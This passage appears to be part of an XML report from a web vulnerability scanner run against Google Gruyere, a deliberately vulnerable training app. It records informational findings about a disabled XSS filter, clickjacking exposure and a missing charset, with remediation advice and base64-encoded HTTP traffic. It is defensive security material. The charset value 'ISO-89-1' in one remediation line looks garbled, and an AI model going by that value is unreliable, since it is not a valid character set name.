A1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPlVucmVjb2duaXplZCBmaWxlIHR5cGUgKC9uZXdhY2NvdW50Lmd0bHhxaTZvbGJ2YXEpLjwvZGl2PgoKCjwvYm9keT4KCjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2697465479321925632</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newsnippet.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newsnippet.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZGI4N2ExYmQ2NmEyMjg4Nzg4MzI4ZWZhZWJkNGY3MzcNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MTo0NyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzExOA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IE5ldyBTbmlwcGV0PC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8aDI+R3J1eWVyZTogTmV3IFNuaXBwZXQ8L2gyPgoKPGRpdiBjbGFzcz0nY29udGVudCc+CjxoMz5BZGQgYSBuZXcgc25pcHBldC48L2gzPgoKCgo8ZGl2IHN0eWxlPSd3aWR0aDo2MDAnPgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQyJz4KPHRleHRhcmVhIG5hbWU9J3NuaXBwZXQnIHJvd3M9JzUnIHN0eWxlPSd3aWR0aDoxMDAlJz48L3RleHRhcmVhPgo8YnI+Cjx0YWJsZSBzdW1tYXJ5PScnIHN0eWxlPSd3aWR0aDoxMDAlJz4KPHRyPgo8dGQgYWxpZ249J2xlZnQnIHZhbGlnbj0ndG9wJz4KICA8aT5MaW1pdGVkIEhUTUwgaXMgbm93IHN1cHBvcnRlZCBpbiBzbmlwcGV0cyAoZS5nLiwgJmx0O2ImZ3Q7LCAmbHQ7aSZndDssCiAgZXRjLikhPC9pPgo8L3RkPgo8dGQgYWxpZ249J3JpZ2h0JyB2YWxpZ249J3RvcCc+CiAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J1N1Ym1pdCc+CjwvdGQ+CjwvdHI+CjwvdGFibGU+CjwvZm9ybT4KPC9kaXY+CjwvYm9keT4KCjwvaHRtbD4KCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8958143130366266368</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newsnippet.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newsnippet.gtl]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZGI4N2ExYmQ2NmEyMjg4Nzg4MzI4ZWZhZWJkNGY3MzcNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MTo0NyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzExOA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IE5ldyBTbmlwcGV0PC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8aDI+R3J1eWVyZTogTmV3IFNuaXBwZXQ8L2gyPgoKPGRpdiBjbGFzcz0nY29udGVudCc+CjxoMz5BZGQgYSBuZXcgc25pcHBldC48L2gzPgoKCgo8ZGl2IHN0eWxlPSd3aWR0aDo2MDAnPgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQyJz4KPHRleHRhcmVhIG5hbWU9J3NuaXBwZXQnIHJvd3M9JzUnIHN0eWxlPSd3aWR0aDoxMDAlJz48L3RleHRhcmVhPgo8YnI+Cjx0YWJsZSBzdW1tYXJ5PScnIHN0eWxlPSd3aWR0aDoxMDAlJz4KPHRyPgo8dGQgYWxpZ249J2xlZnQnIHZhbGlnbj0ndG9wJz4KICA8aT5MaW1pdGVkIEhUTUwgaXMgbm93IHN1cHBvcnRlZCBpbiBzbmlwcGV0cyAoZS5nLiwgJmx0O2ImZ3Q7LCAmbHQ7aSZndDssCiAgZXRjLikhPC9pPgo8L3RkPgo8dGQgYWxpZ249J3JpZ2h0JyB2YWxpZ249J3RvcCc+CiAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J1N1Ym1pdCc+CjwvdGQ+CjwvdHI+CjwvdGFibGU+CjwvZm9ybT4KPC9kaXY+CjwvYm9keT4KCjwvaHRtbD4KCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>110066964209187840</serialNumber>
    <type>8389120</type>
    <name><![CDATA[HTML does not specify charset]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newsnippet.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newsnippet.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-89-1</b>.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZGI4N2ExYmQ2NmEyMjg4Nzg4MzI4ZWZhZWJkNGY3MzcNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MTo0NyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzExOA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IE5ldyBTbmlwcGV0PC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGF